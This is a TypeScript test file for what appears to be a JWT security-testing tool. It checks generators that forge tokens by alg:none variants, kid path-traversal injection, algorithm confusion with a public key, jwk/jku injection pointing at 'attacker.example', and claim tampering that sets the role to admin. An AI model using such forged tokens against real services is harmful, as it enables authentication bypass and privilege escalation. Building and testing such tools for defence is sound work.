import { describe, it, expect } from "vitest";
import { decodeJwt } from "./jwt";
import { base64UrlToBytes, base64UrlToString, bytesToBase64Url } from "./base64url";
import {
  generateAlgNone,
  generateKidInjection,
  generateAlgConfusion,
  generateJwkInjection,
  generateTamperedToken,
  DEFAULT_KID_PAYLOADS,
} from "./attacks";

const SAMPLE =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ.x";
const decoded = decodeJwt(SAMPLE);
const enc = new TextEncoder();

// Independent HMAC (does NOT call the lib) to cross-check forged signatures.
async function hmac(secret: string | Uint8Array, input: string): Promise<string> {
  let kd = typeof secret === "string" ? enc.encode(secret) : secret;
  if (kd.length === 0) kd = new Uint8Array(64);
  const key = await crypto.subtle.importKey(
    "raw",
    kd,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  return bytesToBase64Url(
    new Uint8Array(await crypto.subtle.sign("HMAC", key, enc.encode(input))),
  );
}

function header(token: string): Record<string, unknown> {
  return JSON.parse(base64UrlToString(token.split(".")[0]));
}

describe("alg:none generator", () => {
  it("emits case variants with an empty signature", () => {
    const toks = generateAlgNone(decoded);
    const algs = toks.map((t) => header(t.token).alg);
    expect(algs).toEqual(expect.arrayContaining(["none", "None", "nOnE", "NONE"]));
    for (const t of toks) expect(t.token.endsWith(".")).toBe(true);
  });
});

describe("kid injection generator", () => {
  it("the /dev/null variant is a VALID empty-key HMAC forgery", async () => {
    const toks = await generateKidInjection(decoded, DEFAULT_KID_PAYLOADS);
    const dn = toks[0];
    expect(header(dn.token).kid).toBe(DEFAULT_KID_PAYLOADS.pathTraversal);
    const [h, p, sig] = dn.token.split(".");
    expect(await hmac("", `${h}.${p}`)).toBe(sig);
  });
});

describe("algorithm-confusion generator", () => {
  it("signs HS256 with the public key as the HMAC secret", async () => {
    const pem = "-----BEGIN PUBLIC KEY-----\nMIIBFAKEKEYDATA\n-----END PUBLIC KEY-----\n";
    const toks = await generateAlgConfusion(decoded, pem, "HS256");
    const [h, p, sig] = toks[0].token.split(".");
    expect(header(toks[0].token).alg).toBe("HS256");
    expect(await hmac(pem, `${h}.${p}`)).toBe(sig);
  });
});

describe("jwk injection generator", () => {
  it("produces a token that verifies against its own embedded jwk", async () => {
    const { tokens } = await generateJwkInjection(decoded, "https://attacker.example/jwks.json");
    const embedded = tokens.find((t) => header(t.token).jwk);
    expect(embedded).toBeDefined();
    const hdr = header(embedded!.token);
    const key = await crypto.subtle.importKey(
      "jwk",
      hdr.jwk as JsonWebKey,
      { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
      false,
      ["verify"],
    );
    const [h, p, sig] = embedded!.token.split(".");
    const ok = await crypto.subtle.verify(
      { name: "RSASSA-PKCS1-v1_5" },
      key,
      base64UrlToBytes(sig),
      enc.encode(`${h}.${p}`),
    );
    expect(ok).toBe(true);
  });
});

describe("claim tampering generator", () => {
  it("re-signs an HMAC token that then verifies with the secret", async () => {
    const res = await generateTamperedToken(
      { alg: "HS256", typ: "JWT" },
      { sub: "1337", role: "admin" },
      "secret",
    );
    expect(res.signed).toBe(true);
    const [h, p, sig] = res.token.split(".");
    expect(await hmac("secret", `${h}.${p}`)).toBe(sig);
  });

  it("leaves an unsigned token when alg is none", async () => {
    const res = await generateTamperedToken({ alg: "none" }, { sub: "x" }, "");
    expect(res.signed).toBe(false);
    expect(res.token.endsWith(".")).toBe(true);
  });
});
